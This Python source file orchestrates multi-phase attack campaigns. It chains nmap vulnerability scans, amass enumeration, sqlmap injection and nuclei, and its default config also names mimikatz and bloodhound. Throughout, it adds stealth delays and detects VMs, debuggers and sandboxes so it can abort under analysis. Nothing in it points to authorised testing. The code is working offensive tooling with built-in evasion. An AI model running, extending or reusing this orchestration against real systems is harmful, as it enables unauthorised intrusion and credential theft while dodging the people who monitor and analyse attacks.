"""
Attack Chain Automation Module
Manages multi-phase attack campaigns with context-aware operations
"""

import yaml
import json
import time
import logging
import threading
from typing import Dict, List, Optional, Any
from dataclasses import dataclass
from pathlib import Path
import subprocess
import sys
import os

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

@dataclass
class AttackPhase:
    """Represents a single attack phase in a campaign"""
    name: str
    description: str
    tools: List[str]
    targets: List[str]
    dependencies: List[str]
    abort_conditions: List[str]
    timeout: int = 300
    stealth_level: int = 5  # 1-10 scale
    
class AttackChain:
    """Manages attack campaign execution with context awareness"""
    
    def __init__(self, config_path: str = None):
        self.config_path = config_path or "config/campaign.yaml"
        self.phases: Dict[str, AttackPhase] = {}
        self.current_phase: Optional[str] = None
        self.results: Dict[str, Any] = {}
        self.abort_conditions = {
            'vm_detected': False,
            'debugger_detected': False,
            'network_monitoring': False,
            'sandbox_detected': False
        }
        self.load_config()
        
    def load_config(self):
        """Load campaign configuration from YAML"""
        try:
            config_path = Path(self.config_path)
            if not config_path.exists():
                logger.warning(f"Config file {self.config_path} not found, using defaults")
                self._create_default_config()
                return
                
            with open(config_path, 'r') as f:
                config = yaml.safe_load(f)
                
            for phase_name, phase_data in config.get('phases', {}).items():
                self.phases[phase_name] = AttackPhase(
                    name=phase_name,
                    description=phase_data.get('description', ''),
                    tools=phase_data.get('tools', []),
                    targets=phase_data.get('targets', []),
                    dependencies=phase_data.get('dependencies', []),
                    abort_conditions=phase_data.get('abort_conditions', []),
                    timeout=phase_data.get('timeout', 300),
                    stealth_level=phase_data.get('stealth_level', 5)
                )
                
        except Exception as e:
            logger.error(f"Failed to load config: {e}")
            self._create_default_config()
    
    def _create_default_config(self):
        """Create default campaign configuration"""
        default_config = {
            'phases': {
                'reconnaissance': {
                    'description': 'Initial reconnaissance and enumeration',
                    'tools': ['nmap', 'amass', 'dnsx'],
                    'targets': ['192.168.1.0/24'],
                    'dependencies': [],
                    'abort_conditions': ['vm_detected', 'network_monitoring'],
                    'timeout': 600,
                    'stealth_level': 7
                },
                'exploitation': {
                    'description': 'Vulnerability exploitation',
                    'tools': ['sqlmap', 'nuclei', 'xsstrike'],
                    'targets': [],
                    'dependencies': ['reconnaissance'],
                    'abort_conditions': ['debugger_detected', 'sandbox_detected'],
                    'timeout': 900,
                    'stealth_level': 8
                },
                'post_exploitation': {
                    'description': 'Post-exploitation activities',
                    'tools': ['mimikatz', 'bloodhound'],
                    'targets': [],
                    'dependencies': ['exploitation'],
                    'abort_conditions': ['vm_detected'],
                    'timeout': 1200,
                    'stealth_level': 9
                }
            }
        }
        
        # Save default config
        config_dir = Path("config")
        config_dir.mkdir(exist_ok=True)
        
        with open(self.config_path, 'w') as f:
            yaml.dump(default_config, f, default_flow_style=False)
            
        self.load_config()
    
    def check_abort_conditions(self) -> bool:
        """Check if any abort conditions are met"""
        for condition, detected in self.abort_conditions.items():
            if detected:
                logger.warning(f"Abort condition met: {condition}")
                return True
        return False
    
    def detect_environment(self):
        """Detect hostile environment conditions"""
        # VM detection
        vm_indicators = [
            'VMware', 'VirtualBox', 'QEMU', 'Xen', 'Hyper-V'
        ]
        
        try:
            # Check system information
            if sys.platform == "win32":
                try:
                    import wmi
                    c = wmi.WMI()
                    for item in c.Win32_ComputerSystem():
                        if any(indicator in item.Model for indicator in vm_indicators):
                            self.abort_conditions['vm_detected'] = True
                            logger.warning("VM environment detected")
                except ImportError:
                    logger.debug("WMI module not available on Windows")
            else:
                # Linux VM detection
                try:
                    with open('/proc/cpuinfo', 'r') as f:
                        cpu_info = f.read()
                        if any(indicator in cpu_info for indicator in vm_indicators):
                            self.abort_conditions['vm_detected'] = True
                            logger.warning("VM environment detected")
                except FileNotFoundError:
                    logger.debug("/proc/cpuinfo not available")
        except Exception as e:
            logger.debug(f"VM detection failed: {e}")
        
        # Debugger detection
        try:
            if sys.platform == "win32":
                import ctypes
                if ctypes.windll.kernel32.IsDebuggerPresent():
                    self.abort_conditions['debugger_detected'] = True
                    logger.warning("Debugger detected")
            else:
                # Linux debugger detection
                try:
                    with open('/proc/self/status', 'r') as f:
                        status = f.read()
                        if 'TracerPid:\t0' not in status:
                            self.abort_conditions['debugger_detected'] = True
                            logger.warning("Debugger detected")
                except FileNotFoundError:
                    logger.debug("/proc/self/status not available")
        except Exception as e:
            logger.debug(f"Debugger detection failed: {e}")
    
    def execute_phase(self, phase_name: str) -> bool:
        """Execute a single attack phase"""
        if phase_name not in self.phases:
            logger.error(f"Phase {phase_name} not found")
            return False
            
        phase = self.phases[phase_name]
        self.current_phase = phase_name
        
        logger.info(f"Starting phase: {phase_name}")
        logger.info(f"Description: {phase.description}")
        logger.info(f"Stealth level: {phase.stealth_level}")
        
        # Check dependencies
        for dep in phase.dependencies:
            if dep not in self.results:
                logger.error(f"Dependency {dep} not satisfied")
                return False
        
        # Check abort conditions
        if self.check_abort_conditions():
            logger.warning(f"Aborting phase {phase_name} due to detected conditions")
            return False
        
        # Execute tools
        phase_results = {}
        for tool in phase.tools:
            try:
                result = self._execute_tool(tool, phase)
                phase_results[tool] = result
            except Exception as e:
                logger.error(f"Tool {tool} failed: {e}")
                phase_results[tool] = {'error': str(e)}
        
        self.results[phase_name] = phase_results
        logger.info(f"Phase {phase_name} completed")
        return True
    
    def _execute_tool(self, tool: str, phase: AttackPhase) -> Dict[str, Any]:
        """Execute a specific tool with stealth considerations"""
        logger.info(f"Executing tool: {tool}")
        
        # Add random delays for stealth
        if phase.stealth_level > 7:
            import random
            time.sleep(random.uniform(1, 5))
        
        # Tool-specific execution logic
        if tool == 'nmap':
            return self._run_nmap(phase)
        elif tool == 'amass':
            return self._run_amass(phase)
        elif tool == 'sqlmap':
            return self._run_sqlmap(phase)
        elif tool == 'nuclei':
            return self._run_nuclei(phase)
        else:
            return {'status': 'tool_not_implemented', 'tool': tool}
    
    def _run_nmap(self, phase: AttackPhase) -> Dict[str, Any]:
        """Run nmap with stealth options"""
        cmd = [
            'nmap', '-sS', '-sV', '-O', '--script=vuln',
            '--min-rate=100', '--max-retries=2'
        ]
        
        if phase.stealth_level > 8:
            cmd.extend(['--timing=4', '--max-scan-delay=1000'])
        
        for target in phase.targets:
            cmd.append(target)
        
        try:
            result = subprocess.run(
                cmd, 
                capture_output=True, 
                text=True, 
                timeout=phase.timeout
            )
            return {
                'status': 'success',
                'stdout': result.stdout,
                'stderr': result.stderr,
                'returncode': result.returncode
            }
        except subprocess.TimeoutExpired:
            return {'status': 'timeout'}
        except Exception as e:
            return {'status': 'error', 'error': str(e)}
    
    def _run_amass(self, phase: AttackPhase) -> Dict[str, Any]:
        """Run amass enumeration"""
        cmd = ['amass', 'enum', '-passive']
        
        for target in phase.targets:
            cmd.extend(['-d', target])
        
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=phase.timeout
            )
            return {
                'status': 'success',
                'stdout': result.stdout,
                'stderr': result.stderr,
                'returncode': result.returncode
            }
        except subprocess.TimeoutExpired:
            return {'status': 'timeout'}
        except Exception as e:
            return {'status': 'error', 'error': str(e)}
    
    def _run_sqlmap(self, phase: AttackPhase) -> Dict[str, Any]:
        """Run sqlmap with stealth options"""
        cmd = [
            'sqlmap', '--batch', '--random-agent',
            '--level=1', '--risk=1'
        ]
        
        if phase.stealth_level > 8:
            cmd.extend(['--delay=2', '--time-sec=10'])
        
        # Add targets from previous phases
        for target in self._get_targets_from_previous_phases():
            cmd.extend(['-u', target])
        
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=phase.timeout
            )
            return {
                'status': 'success',
                'stdout': result.stdout,
                'stderr': result.stderr,
                'returncode': result.returncode
            }
        except subprocess.TimeoutExpired:
            return {'status': 'timeout'}
        except Exception as e:
            return {'status': 'error', 'error': str(e)}
    
    def _run_nuclei(self, phase: AttackPhase) -> Dict[str, Any]:
        """Run nuclei vulnerability scanner"""
        cmd = ['nuclei', '-silent', '-severity=medium,high,critical']
        
        for target in self._get_targets_from_previous_phases():
            cmd.extend(['-u', target])
        
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=phase.timeout
            )
            return {
                'status': 'success',
                'stdout': result.stdout,
                'stderr': result.stderr,
                'returncode': result.returncode
            }
        except subprocess.TimeoutExpired:
            return {'status': 'timeout'}
        except Exception as e:
            return {'status': 'error', 'error': str(e)}
    
    def _get_targets_from_previous_phases(self) -> List[str]:
        """Extract targets from previous phase results"""
        targets = []
        for phase_name, results in self.results.items():
            if 'nmap' in results and results['nmap'].get('status') == 'success':
                # Parse nmap output for discovered hosts
                output = results['nmap'].get('stdout', '')
                # Simple IP extraction - in production, use proper parsing
                import re
                ips = re.findall(r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b', output)
                targets.extend(ips)
        return list(set(targets))
    
    def run_campaign(self, phases: List[str] = None) -> bool:
        """Run complete attack campaign"""
        logger.info("Starting attack campaign")
        
        # Detect environment first
        self.detect_environment()
        
        if self.check_abort_conditions():
            logger.warning("Campaign aborted due to detected conditions")
            return False
        
        # Determine phases to run
        if phases is None:
            phases = list(self.phases.keys())
        
        # Execute phases in order
        for phase_name in phases:
            if not self.execute_phase(phase_name):
                logger.error(f"Campaign failed at phase: {phase_name}")
                return False
            
            # Check abort conditions between phases
            if self.check_abort_conditions():
                logger.warning("Campaign aborted between phases")
                return False
        
        logger.info("Campaign completed successfully")
        return True
    
    def save_results(self, output_path: str = "results/campaign_results.json"):
        """Save campaign results to file"""
        try:
            output_dir = Path(output_path).parent
            output_dir.mkdir(exist_ok=True)
            
            with open(output_path, 'w') as f:
                json.dump(self.results, f, indent=2)
            
            logger.info(f"Results saved to {output_path}")
        except Exception as e:
            logger.error(f"Failed to save results: {e}")
    
    def get_phase_status(self) -> Dict[str, str]:
        """Get status of all phases"""
        status = {}
        for phase_name in self.phases:
            if phase_name in self.results:
                status[phase_name] = 'completed'
            elif phase_name == self.current_phase:
                status[phase_name] = 'running'
            else:
                status[phase_name] = 'pending'
        return status 